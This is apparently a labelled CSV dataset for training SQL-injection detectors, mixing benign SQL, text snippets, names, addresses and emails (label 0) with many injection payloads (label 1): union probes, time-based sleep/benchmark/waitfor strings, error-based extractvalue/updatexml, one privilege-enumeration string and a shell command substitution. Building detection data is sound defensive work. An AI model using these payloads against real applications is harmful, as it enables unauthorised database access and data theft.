Query,Label
7509082311963954,0
SELECT * INTO newtable [IN externaldb ] FROM oldtable WHERE condition,0
hoyer,0
61323691x,0
SELECT TOP 3 * FROM share WHERE grew = 'greatest' SELECT * FROM fireplace,0
"1 and 5556 =  ( select count ( * )  from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) -- gynj",1
SELECT * FROM west WHERE studied BETWEEN luck09/01/1996nodded AND little15/31/1996front,0
"select benchmark ( 5000000,md5 ( 0x4c4d6142  )  )   ) +'",1
select  ( case when  ( 5464 = 9350 )  then 5464 else cast ( 1 as int ) / ( select 0 from dual )  end )  from dual--,1
"SELECT product AS wonder, connected AS [herd]  FROM lunch",0
49820,0
"-1634%' union all select 5937,5937,5937,5937--",1
munbrega,0
-3499'   )    )     )   or 2724 in    (    (   char  (  113  )  +char  (  113  )  +char  (  112  )  +char  (  106  )  +char  (  113  )  +  (  select   (  case when   (  2724  =  2724  )   then char  (  49  )   else char  (  48  )   end   )    )   +char  (  113  )  +char  (  122  )  +char  (  118  )  +char  (  122  )  +char  (  113   )    )     )   and    (    (     (  'nzap' like 'nzap,1
SELECT * FROM sheep,0
"All three face maximum penalty life imprisonment , according authorities",0
desnarigada,0
"1%"" and   (  select * from   (  select  (  sleep  (  5   )    )     )  gcrr  )  #",1
select * from users where id = 1 %$ . or 1 = 1 -- 1,1
"Trading Nasdaq Options Market interrupted Friday afternoon , German time",0
rohan,0
"1 )  or extractvalue ( 1297,concat ( 0x5c,0x7171706a71, ( select  ( elt ( 1297 = 1297,1  )  )   ) ,0x717a767a71  )  )   and  ( 1185 = 1185",1
"INSERT INTO Customers  ( CustomerName, City, Country )  VALUES  ( 'Cardinal', 'Stavanger', 'Norway' ) ;",0
1059928902417697,0
"The American Civil Liberties Union deeply concerned , , raising variety privacy issues",0
"rio ter, 86, 5?g",0
6107572427974464,0
SELECT * FROM attached WHERE owner NOT LIKE '[blue]%',0
"1""   )    )     )   waitfor delay '0:0:5'--",1
"call regexp_substring  (  repeat  (  right  (  char  (  3702  )  ,0  )  ,500000000  )  ,null  )   and   (  9646  =  9646",1
"1'  )  )   )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and   (  (   ( 'ymad' like 'ymad",1
"-7485%'  )  )   )  union all select 1303,1303,1303,1303,1303,1303,1303,1303,1303--",1
"And another research paper University Victoria Canada , said: &quot; Dogs likely approach robot dog &apos; tail &apos; made wag left rather right , rather becoming anxious - opposite way around Italian study",0
"-3017""  )  )   as ljit where 9128 = 9128 union all select 9128,9128,9128,9128,9128--",1
"1' )  union all select null,null,null,null--",1
"SELECT * FROM show ORDER BY fellow ASC, wall DESC",0
26527823z,0
"-3505""  )   or 5290  =  3436--",1
1'|| ( select 'kuxp' where 7123 = 7123 and 1688 = 4200#,1
The authorities called twice deal children throwing eggs houses,0
rached,0
SELECT COUNT ( uncle ) FROM active,0
"1"" )  as paai where 4089 = 4089 and 3707 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
"Stating reason , Felder-Bauer said: &quot; We barely skilled workers fields skilled crafts trades , healthcare geriatric care",0
hlinka,0
"SELECT Employees.carry, COUNT ( Orders.referID )  AS dreamFROM    ( OrdersINNER JOIN explanation ON Orders.blowID  =  Employees.exerciseID )",0
pacfica,0
"select * from users where id = '1' + @<@# union select 1,version (  )  -- 1'",1
declare @s varchar   (  8000  )   select @s   =   0x73656c ...,1
"1 where 2267  =  2267 and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  --",1
1' and 5967 = 4184#,1
"-8506'  )  )   )  union all select 1950,1950,1950,1950,1950,1950--",1
SELECT * FROM lost,0
-7209'  )  )   )  or 3440 = cast  (  (  chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113  )  )  || ( select  ( case when  ( 3440 = 3440 )  then 1 else 0 end  )  )  ::text|| ( chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113  )  )   as numeric )  and   (  (   ( 'stqx' = 'stqx,1
1  )  )   as dqfl where 7527 = 7527,1
"Moreover , I believe partisan obstructionism upended many efforts push nation forward: immigration reform , public option health care , closing base Guantanamo Bay , among others",0
DELETE FROM slightly,0
kindelan,0
"1%' )  procedure analyse ( extractvalue ( 5840,concat ( 0x5c,0x7171706a71, ( select  ( case when  ( 5840 = 5840 )  then 1 else 0 end  )  )  ,0x717a767a71  )  )  ,1 )  and  ( '%' = '",1
"1""  )  )   and 6510 =  ( select count ( * )  from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 )  and   (  (  ""vjvz"" like ""vjvz",1
1' )  where 2763 = 2763,1
calvin@espaciodelpintor.by,0
"-1148""   )    )    union all select 5442,5442,5442,5442#",1
-5830'  )   as fivy where 2173  =  2173 or 5903  =    (  'qqpjq'||  (  select case 5903 when 5903 then 1 else 0 end from rdb$database  )  ||'qzvzq'  )  --,1
"end and    (    (     (  ""revx""  =  ""revx",1
fulmnica,0
0455475530257708,0
"Two months election , electoral commission officially declared Mr Palmer winner Sunshine Coast seat Fairfax 53 votes , recount",0
"""hi"""" )  or  ( """"a"""" = """"a""",1
elezaro,0
SELECT * FROM earlier WHERE write = 'oxygen'  OR wool = 'lie',0
"-1339   )    )     )   union all select 2938,2938,2938,2938,2938,2938#",1
"1%' or char  (  119  )  ||char  (  100  )  ||char  (  99  )  ||char  (  121  )    =  regexp_substring  (  repeat  (  right  (  char  (  1441  )  ,0  )  ,5000000000  )  ,null  )  --",1
c/ dionisio acebal 41,0
a' waitfor delay '0:0:10'--,1
"1 where 8273  =  8273 union all select null,null,null,null,null,null,null,null#",1
$  (  sleep 50  ),1
8547,0
bourget,0
1 )  and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #,1
2756434329152004,0
"1' in boolean mode  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"1'  )  )   as usrk where 6324 = 6324 union all select null,null,null,null,null,null,null,null,null,null--",1
asia,0
fustukian@comercioenlacalle.tf,0
SELECT written ( s ) FROM sail INNER JOIN,0
or 2 between 1 and 3,1
broaddus@inversioneolica.eu,0
arda,0
"plaza diego herrera lorenzo, 148 8?e",0
gino,0
navarra,0
almagrar,0
"1'+  (  select vupb where 9575  =  9575 union all select null,null,null,null,null,null,null,null,null,null--",1
"abubilla, 125 12h",0
1'  )  )   rlike sleep ( 5 )  and   (  (  'tufg' = 'tufg,1
"Some world &apos;s largest banks , including UBS , Barclays , Deutsche Bank RBS , confirmed co-operating regulators investigations world &apos;s largest financial market , $ 5",0
"calle padre arintero, 149",0
"SELECT children AS character, leg AS [coach]  FROM some",0
"-9078 union all select 3779,3779,3779,3779,3779,3779,3779,3779--",1
"SELECT examine,coffee FROM short WHERE aside = 'notice' UNION SELECT triangle, nor FROM sets",0
0293148493278191,0
asander1@nutrimama.do,0
ryan,0
haiti 27 1?g,0
"SELECT * FROM smell ORDER BY grow ASC, religious DESC",0
"1""  )  )   as tybm where 2687 = 2687 or elt ( 5873 = 5873,sleep ( 5  )  )  #",1
envaronar,0
"The darker meat , higher pH value",0
SELECT MIN ( story )  AS merely FROM team,0
co*marca,0
"1%""   )    )     )   and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (     (  ""%""  =  """,1
"-4929"" where 6381 = 6381 or 8571 = 8571--",1
"carretera cirera 186,",0
"-7324 )  or make_set ( 8486 = 6544,6544 )",1
22010612a,0
"Absolve yourself, shall suffrage world",0
"calle pianista berdion, s/n, 13?g",0
"1'|| ( select 'jrbp' from dual where 4129 = 4129 or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"So far , candidate succeed Mayor Norbert Brugger , longer running account age , 46-year-old banker business economist Dieter Köpfler Löffingen",0
"-7714 where 9768 = 9768 union all select 9768,9768--",1
benisuera,0
"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",1
SELECT simple ( s ) FROM court INNER JOIN,0
aarn,0
polis-berkel@prestigecars.ag,0
"1 )  and 8514 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )",1
p5r0i9i5ar,0
64633352v,0
SELECT * FROM crack,0
"-6263"" union all select 8005,8005#",1
kindra,0
SELECT AVG ( recognize ) FROM quiet,0
verdi,0
"calle hemingway, s/n",0
1   )    )    as pxmz where 2596  =  2596,1
SELECT * FROM worker WHERE heading = 'due' FETCH FIRST 3 ROWS ONLY,0
SELECT * FROM Products,0
colote,0
"select pg_sleep ( 5 )  and  ( ""tpry"" = ""tpry",1
"c/ las niadas, 67 9?f",0
"select * from users where id = 1 + \+*$ union select null,@@VERSION -- 1",1
"-2216   )    )    as hxmq where 5677  =  5677 union all select 5677,5677--",1
"-9398' union all select 3998,3998,3998,3998,3998,3998,3998,3998,3998#",1
ardurn,0
mcavoy-zabczynski@discotecateatre.gt,0
SELECT * FROM salt WHERE center NOT LIKE 'breath%',0
"1"" )  or 9643 =  ( select count ( * )  from domain.domains as t1,domain.columns as t2,domain.tables as t3 )  and  ( ""vudj"" like ""vudj",1
mantela-do,0
SELECT * FROM strike WHERE fighting = 'accurate'  AND City = 'exact',0
muth,0
"elt  (  8192  =  8192,sleep  (  5   )    )",1
31788831w,0
SELECT * FROM shade WHERE depend NOT BETWEEN 'milk' AND 'possibly',0
1152,0
"In August , New York City agreed end practice storing names addresses people whose cases dismissed police stop",0
17488,0
3155,0
"INSERT INTO solar ( army, rise, youth, course, select, electricity )  VALUES  ( 'exist', 'anywhere'. product', 'near', 'market', 'section', 'however' )",0
"SELECT * FROM game WHERE tie NOT IN  ( 'glad', 'dig', 'largest' )",0
marcos,0
goth-komarov@frenchpolynesia.com.mg,0
natn,0
"select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and   (  9481  =  9481",1
"1  )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )",1
16535,0
"select * from users where id = 1 or "" ( 1"" or 1 = 1 -- 1",1
SELECT AVG ( funny ) FROM early SELECT SUM ( monkey ),0
1'||  (  select 'scct' where 2587  =  2587 and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno   )    )   ||',1
93tip72ar,0
SELECT * FROM chapter,0
SELECT MIN ( spirit )  AS plastic FROM expect,0
He may well concern shadow wall,0
"There class persons spiritual affinity I bought sold; I go prison, need be; miscellaneous popular charities; education college fools; building meeting-houses vain end many stand; alms sots; thousandfold Relief Societies; — though I confess shame I sometimes succumb give dollar, wicked dollar I shall manhood withhold",0
"1 and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
09614,0
The increasing number riders live work area fantastic development,0
leonella,0
saltigallo,0
1'   )    )    as hxxm where 3792  =  3792 and sleep  (  5  )  #,1
"-6772""   )    )    or 9323  =  9323#",1
"1""  )  )   and 5421 = 4804--",1
SELECT * FROM garage WHERE pie BETWEEN '1996-07-01' AND '1996-07-31',0
SELECT one FROM writer UNION ALL SELECT pony FROM central ORDER BY plate,0
72219452g,0
torrescrcela,0
"1 where 7362  =  7362 and 8148  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
contreras,0
964,0
if  (  3593  =  3779  )   select 3593 else drop function qtqy--,1
"1 and elt  (  3172  =  7243,7243  )",1
40176,0
1'   )    )    and 7756  =  dbms_utility.sqlid_to_sqlhash   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  7756  =  7756  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and    (    (   'mmfq'  =  'mmfq,1
maraa,0
"c/ francisco santos, 96",0
SELECT COUNT ( DISTINCT hide )  FROM block,0
"1  )   or 8315  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )",1
SELECT * FROM are  WHERE ice = managed,0
"1  )   where 2020  =  2020 and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",1
-4768'||  (  select 'dded' from dual where 6499  =  6499 union all select 6499--,1
SELECT TOP 50 PERCENT * FROM chamber SELECT * FROM terrible FETCH FIRST 50 PERCENT ROWS ONLYSELECT TOP 3 * FROM blow,0
or sleep  (  __TIME__  )  #,1
"&quot; Mr Ditta accused abusing position criminal solicitor , become involved specific clients",0
"1'   )    )    or 8384  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )    and    (    (   'aumk' like 'aumk",1
ponferrada 65 10-c,0
select   (  case when   (  4755  =  4784  )   then 1 else 4755*  (  select 4755 from master..sysdatabases  )   end  )  --,1
"rua picouto, 14,",0
6bn,0
"1   )    )    and make_set  (  8554  =  3286,3286  )   and    (    (   7385  =  7385",1
ductilidad,0
"1"" and  ( 1668 = 8054 ) *8054",1
"cubo de tierra del vino, el",0
9553145655570533,0
81208495a,0
SELECT MIN ( age )  AS basic FROM because,0
garantir,0
"1"" )  or  ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select  ( elt ( 9173 = 9173,1  )  )   ) ,0x717a767a71,floor ( rand ( 0 ) *2  )  )  x from information_schema.character_sets group by x ) a )  and  ( ""rwlq"" = ""rwlq",1
SELECT Count ( * )  AS again,0
23670,0
/**/or/**/1/**/ = /**/1,1
bradney4,0
"1'||  (  select 'ysij' from dual where 6140  =  6140 procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1   )    )   ||'",1
griffy,0
"calle albia de castro, s/n",0
4291270000000000,0
"1 )  or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c  )  )  #",1
"1 where 6095  =  6095 and 8407  =    (  select count  (  *  )   from generate_series  (  1,5000000   )    )   --",1
UPDATE particular SET melted = 'hunter'WHERE example = 'satellites',0
3375570000000000,0
select * from users where id  =  1 + $+%$ or 1  =  1 -- 1,1
ezella,0
"1"" or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""bkrk""  =  ""bkrk",1
38847166m,0
olmo,0
"-4473'  )   union all select 7656,7656#",1
-7742 )  as tgzq where 7842 = 7842 or 2062 = 1563,1
"1"" and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and ""jcgh""  =  ""jcgh",1
557ni03r5o,0
"UPDATE receive SET face =  'nodded', City =  'cup' WHERE by =  pony",0
SELECT * FROM cause  WHERE not = single,0
43595,0
16824275m,0
!,1
tardguila,0
1'+  (  select tafk where 9652  =  9652,1
flo3a,0
04711214d,0
34257,0
"1""  )  )   or 2367 =  ( select count ( * )  from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1
8029,0
"1""  )  )   as eqeb where 6784 = 6784 and updatexml ( 3393,concat ( 0x2e,0x7171706a71, ( select  ( elt ( 3393 = 3393,1  )  )   ) ,0x717a767a71 ) ,1161 ) --",1
9728,0
"virgen de los imposibles 162,",0
"According The Star newspaper , new bill effectively hand government &quot; stranglehold media , &quot; The Standard said democracy free speech Kenya &quot; dealt major blow &quot; lambasted bill &quot; draconian",0
"1'   )    )    and make_set  (  3793  =  8118,8118  )   and    (    (   'swvc' like 'swvc",1
41,0
waggenheim@rubirubi.info,0
-7505'   )    )    as lqvw where 8565  =  8565 or 6872  =  6872--,1
"1""   )    )     )   and   (  3020  =  3020  )  *6703 and    (    (     (  ""fqap"" like ""fqap",1
9226,0
glatzeder.karr@lamejorplaya.so,0
"SELECT reason AS essential, grew AS [wheat]  FROM distance",0
SELECT * FROM compare WHERE period  BETWEEN 10 AND 20,0
oxendine,0
otorgamiento,0
"UPDATE bean SET well =  'replied', City =  'gain' WHERE mathematics =  twice",0
amarr1,0
"1"" where 5098  =  5098 and 2853  =  cast   (    (   chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113   )    )   ||  (  select   (  case when   (  2853  =  2853  )   then 1 else 0 end   )    )   ::text||  (  chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    as numeric  )  --",1
cejadero,0
"The target &quot; missiles related equipment &quot; , Israeli government feared intended Lebanese Hezbollah , according CNN",0
butalov0@lettere.dm,0
tiefenth,0
"1"" union all select null,null,null,null,null,null,null,null,null,null#",1
"1'+ ( select unzl where 3432 = 3432 union all select null,null,null,null--",1
"These included Philipp Pangerl , semi-professional mountain biker Black Tusk Racing Team",0
SELECT * FROM unit WHERE daily = 'friend' FETCH FIRST 3 ROWS ONLY,0
spruance@maquillajeparalabios.ro,0
bryson2@casablancabeach.kp,0
83236273d,0
"At present , fewer fewer young people deciding study theology Abitur examinations (equivalent A levels)",0
1' order by 1--,1
eranio,0
or pg_sleep ( __TIME__ ) --,1
"Referring drug gangs , Duffy assured: &quot; If continue build attempt use tunnels , determined make big waste dirty money &quot;",0
"select count  (  *  )   from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and   (  ""yobb"" like ""yobb",1
SELECT AVG ( rate ) FROM another SELECT SUM ( addition ),0
"-7422"" union all select 9127,9127,9127,9127,9127,9127,9127,9127,9127,9127#",1
"UPDATE whole SET life =  'man', City =  'key' WHERE recall =  valuable",0
"SELECT safetyID AS ID, row AS me FROM action",0
"1%""   )    )    union all select null,null,null,null,null,null,null,null,null,null#",1
"SELECT * FROM human ORDER BY social ASC, exercise DESC",0
94987112x,0
"calle almonte 68, 5?g",0
* ( | ( mail = *  )  ),1
SELECT * FROM room WHERE tide = 'mighty'  OR plenty = 'of',0
hassold,0
"In addition, computation models use rich set syntactic features, improve complicated punctuation predictions global view, especially long range dependencies",0
peabody,0
SELECT option_value FROM wp_options WHERE option_name  =  'houzez_tax_settings' LIMIT 1,0
"1"" where 6686  =  6686 or elt  (  6272  =  6272,sleep  (  5   )    )   --",1
remiendo,0
-5547' or 9323 = 9323#,1
or 2 between 1 and 3,1
48128,0
s16nio5o,0
"The City Magistrate today discussed submission head department transport , Stefan Majer (Green Party)",0
nhat,0
"With great technical effort , also possible conceal metadata email communication even possible tell communicating",0
"-1166'   )    )    as icdz where 1042  =  1042 union all select 1042,1042,1042,1042,1042#",1
4296,0
"1%""   )    )    or 6979  =  like  (  'abcdefg',upper  (  hex  (  randomblob  (  500000000/2   )    )      )    )   --",1
"1%' )  and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2  )  )    )  )  --",1
"select * from users where id = 1 *1 union select 1,banner from v$version where rownum = 1 -- 1",1
tonkovic,0
select * from users where id = '1' or \.<\ or 1 = 1 -- 1',1
26241,0
villalobn,0
5176,0
"select * from users where id = '1' union select $[""],@@VERSION -- 1'",1
SELECT * FROM nearly FETCH FIRST 3 ROWS ONLY SELECT TOP 50 PERCENT * FROM fully,0
abarraganamiento,0
"allies , though agency &apos;s chief said week inaccurate reflected misunderstanding metadata Nato allies collected shared United States",0
"1%"" or 7417 =  ( select count ( * )  from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) --",1
80914738w,0
1 or 1 = 1,1
"1' )  as dwgv where 1525 = 1525 union all select null,null--",1
"gregoria hernandez 67, 13g",0
"1' and 6510  =    (  select count  (  *  )   from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7  )   and 'zjxk'  =  'zjxk",1
7,0
1  )  )   as xroy where 3274 = 3274,1
calle petunias 34 1-e,0
SELECT column_name FROM table_name WHERE ROWNUM < =  number,0
Her agency agency advises people topic &apos; growing old &apos;,0
"c/ pintor viver s/n, 1?b",0
fontanarejo,0
wilson@autoconstruccion.fi,0
villamuriel de cerrato,0
10970,0
"-6809""  )  )   or 5903 =  ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' )  and   (  (  ""nfnf"" = ""nfnf",1
"calle del mistral, 65",0
maciela,0
SELECT * FROM meal WHERE thus = 'development' FETCH FIRST 3 ROWS ONLY,0
select * from users where id = '1' * ( \ )  or 1 = 1 -- 1',1
ebony,0
-8369 )  where 7234 = 7234 order by 1--,1
SELECT * FROM indeed,0
"Familiar voice mind each, highest merit ascribe Moses, Plato, Milton is, set naught books traditions, spoke men thought",0
1959107690181502,0
SELECT major FROM space UNION SELECT design FROM peace ORDER BY south,0
cecon5,0
neugebauer@buscamoto.gw,0
"This week Standard &amp; Poor &apos;s , rating agency , cited increasing household leverage , mainly rising mortgages , risk factor Asian banks &quot; creditworthiness",0
05631,0
"' AND 1 = utl_inaddr.get_host_address  (  (  SELECT DISTINCT ( granted_role )  FROM  ( SELECT DISTINCT ( granted_role ) , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE = SYS.LOGINUSER )  WHERE LIMIT = 6  )  )   AND 'i' = 'i",1
"SELECT RTRIM ( ""SQL Tutorial     "" )  AS RightTrimmedString;",0
81887613t,0
"1%"" and  ( select * from  ( select ( sleep ( 5  )  )   ) gcrr ) #",1
"elt  (  2427  =  2427,5518  )",1
"select count  (  *  )   from generate_series  (  1,5000000  )   and    (    (     (  ""uydm""  =  ""uydm",1
"1""  )  )   as mlid where 1047 = 1047 union all select null,null#",1
if ( 1087 = 5839 )  select 1087 else drop function zzeh--,1
6egas0a,0
"8 million , also stood around EUR one million projections",0
SELECT * FROM  ( SELECT either FROM include ),0
7828706714204414,0
"1%"" )  and  ( select * from  ( select ( sleep ( 5  )  )   ) fzno )  and  ( ""%"" = """,1
", 2006; Huang Zweig, 2002; Stolcke Shriberg, 1996)",0
"1%' union all select null,null,null,null,null,null,null,null,null,null--",1
"don quijote 81,",0
DELETE FROM review,0
SELECT * FROM excitement 3 SELECT * FROM railroad,0
"1' in boolean mode  )   and char  (  111  )  ||char  (  77  )  ||char  (  121  )  ||char  (  88  )    =  regexp_substring  (  repeat  (  left  (  crypt_key  (  char  (  65  )  ||char  (  69  )  ||char  (  83  )  ,null  )  ,0  )  ,500000000  )  ,null  )  #",1
; or '1' = '1',1
"1  )   and 8189  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )  --",1
"calle practicante calixto rodriguez 163,",0
1 and 8594 =  ( select 8594 from pg_sleep ( 5  )  )  --,1
pacn,0
"1%""   )    )     )   and elt  (  4249  =  4249,7259  )   and    (    (     (  ""%""  =  """,1
07094139l,0
"select * from users where id  =  1 or ""?  (  "" or 1  =  1 -- 1",1
1 and  ( 1977 = 6852 ) *6852-- clxl,1
1'+  (  select oljg where 2006  =  2006 and 3754  =    (  select upper  (  xmltype  (  chr  (  60  )  ||chr  (  58  )  ||chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  3754  =  3754  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113  )  ||chr  (  62   )    )     )   from dual   )    )   +',1
FROM  ( SELECT DISTINCT wealth FROM black ),0
In every work genius recognize rejected thoughts: come back us certain alienated majesty,0
rasifo,0
gabarri,0
goodman4,0
tarpey@bwds.ne,0
"INSERT INTO paper  ( plant, potatoes, powder )  VALUES  ( 'willing', 'stood', 'ice' )",0
enang.ostar,0
"1 and  ( select 2* ( if  (  (  select * from  ( select concat ( 0x7171706a71, ( select  ( elt ( 3484 = 3484,1  )  )   ) ,0x717a767a71,0x78  )  )  s ) , 8446744073709551610, 8446744073709551610  )  )   )",1
One conduct transition actions parsing followed punctuation predictions cascaded way,0
faro@vilano.pf,0
"1%'  )  )   union all select null,null,null,null,null,null,null,null--",1
gala,0
"select * from users where id = '1' or  ( \ )  = 1 union select 1,@@VERSION -- 1'",1
SELECT AVG ( curve )  FROM cat  SELECT SUM ( read ),0
clara,0
SELECT DISTINCT solar FROM fifth,0
"-2086%'   )    )     )   or make_set  (  9354  =  9354,7185  )   and    (    (     (  '%'  =  '",1
1'  )   where 4949  =  4949,1
carmelo,0
reiko,0
The Front popular party France 24 per cent vote - timely warning British Labour &apos;t assume split right automatically favour left,0
pradeep,0
"select * from users where id  =  1 -@<@ union select version  (    )  ,version  (    )   -- 1",1
68733218h,0
hirotaka,0
"burgos, s/n, 1f",0
zool7ic1,0
"o rio, 134,",0
-9657'  )   as ziiq where 7725  =  7725 or 3038  =  3038,1
73361115q,0
3339,0
"1%"" and updatexml  (  3393,concat  (  0x2e,0x7171706a71,  (  select   (  elt  (  3393  =  3393,1   )    )     )  ,0x717a767a71  )  ,1161  )   and ""%""  =  """,1
"Fighting back tears , said Patek sentenced death",0
Phase One consist new high speed rail line London West Midlands,0
SELECT * FROM cold 3,0
coursdev,0
Pressure building FAA recent years ease restrictions use,0
'hi' or 'x' = 'x';,1
khanvali,0
1'  )   or sleep  (  5  )   and   (  'mdmr' like 'mdmr,1
baz_azais@filtraciondehumos.sb,0
47649,0
"1%"" or sleep  (  5  )  #",1
"1""   )    )    and 3707  =    (  select count  (  *  )   from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3  )   and    (    (   ""uglh"" like ""uglh",1
3948100340900216,0
1  )   or sleep  (  5  ),1
"-3729'  )  )   or elt ( 4482 = 2648,2648 )  and   (  (  'vkkr' like 'vkkr",1
vyky,0
1'  )   as pxcd where 9754  =  9754 or sleep  (  5  )  --,1
But nobody quite ready three-year-old Fenton Kirkland,0
aguzadera,0
"1' in boolean mode  )   and 6537  =  dbms_pipe.receive_message  (  chr  (  76  )  ||chr  (  116  )  ||chr  (  117  )  ||chr  (  65  )  ,5  )  #",1
chmara@novolardiseno.ky,0
"The deed drawn Kirchen (Hausen), time location courthouse",0
leeson,0
"-1513""  )   as swvd where 2958  =  2958 union all select 2958,2958,2958--",1
del ngel kercad,0
"-5205'  )  )   union all select 8592,8592,8592,8592,8592,8592--",1
"SELECT good, tobacco, compare FROM impossible WHERE contrast  IS NULL",0
-3535%'  )  )   )  or 5605 = 4660 and   (  (   ( '%' = ',1
matilla la seca,0
gu5cima,0
"1'  )   as woka where 4316  =  4316 and 5556  =    (  select count  (  *  )   from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5  )  --",1
